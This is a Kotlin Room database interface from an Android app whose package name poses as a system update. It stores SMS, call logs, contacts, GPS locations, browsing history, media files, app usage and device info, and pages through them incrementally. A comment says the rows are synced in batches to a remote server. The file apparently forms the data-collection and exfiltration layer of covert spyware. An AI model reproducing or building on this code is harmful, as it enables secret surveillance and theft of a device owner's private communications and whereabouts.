package com.androidsystem.update.database

import androidx.room.*

@Dao
interface TelemetryDao {
    @Insert
    suspend fun insertCollectedData(data: CollectedDataEntity): Long

    @Insert
    suspend fun insertLocationData(data: LocationEntity): Long

    @Insert
    suspend fun insertSms(data: SmsEntity): Long

    @Insert
    suspend fun insertCall(data: CallEntity): Long

    @Insert
    suspend fun insertContact(data: ContactEntity): Long

    @Insert
    suspend fun insertBrowsingHistory(data: BrowsingHistoryEntity): Long

    @Insert
    suspend fun insertMediaFile(data: MediaFileEntity): Long

    @Insert
    suspend fun insertDeviceInfo(data: DeviceInfoEntity): Long

    @Insert
    suspend fun insertAppUsage(data: AppUsageEntity): Long

    @Query("SELECT * FROM collected_data WHERE synced = 0 ORDER BY timestamp DESC LIMIT :limit")
    suspend fun getUnsynced(limit: Int): List<CollectedDataEntity>

    @Query("UPDATE collected_data SET synced = 1 WHERE id = :id")
    suspend fun markSynced(id: Long)

    @Query("DELETE FROM collected_data WHERE timestamp < :cutoff")
    suspend fun cleanupOldData(cutoff: Long)

    @Query("SELECT * FROM location_data ORDER BY timestamp DESC LIMIT 1")
    suspend fun getLastLocation(): LocationEntity?

    // --- Incremental sync: rows inserted after a stored id cursor. ---
    // The device collects structured telemetry (SMS, calls, contacts, GPS,
    // browsing, media, app usage, device info) into Room. Every sync cycle the
    // service pulls only rows newer than the last synced id per table and ships
    // them to the server as typed batch messages; the server dedupes by content
    // hash and caps each module collection.
    @Query("SELECT * FROM sms_data WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
    suspend fun getSmsAfter(lastId: Long, limit: Int): List<SmsEntity>

    @Query("SELECT * FROM call_data WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
    suspend fun getCallsAfter(lastId: Long, limit: Int): List<CallEntity>

    @Query("SELECT * FROM contact_data WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
    suspend fun getContactsAfter(lastId: Long, limit: Int): List<ContactEntity>

    @Query("SELECT * FROM location_data WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
    suspend fun getLocationsAfter(lastId: Long, limit: Int): List<LocationEntity>

    @Query("SELECT * FROM browsing_history WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
    suspend fun getBrowsingAfter(lastId: Long, limit: Int): List<BrowsingHistoryEntity>

    @Query("SELECT * FROM media_files WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
    suspend fun getMediaAfter(lastId: Long, limit: Int): List<MediaFileEntity>

    @Query("SELECT * FROM app_usage WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
    suspend fun getAppUsageAfter(lastId: Long, limit: Int): List<AppUsageEntity>

    @Query("SELECT * FROM device_info WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
    suspend fun getDeviceInfoAfter(lastId: Long, limit: Int): List<DeviceInfoEntity>
}
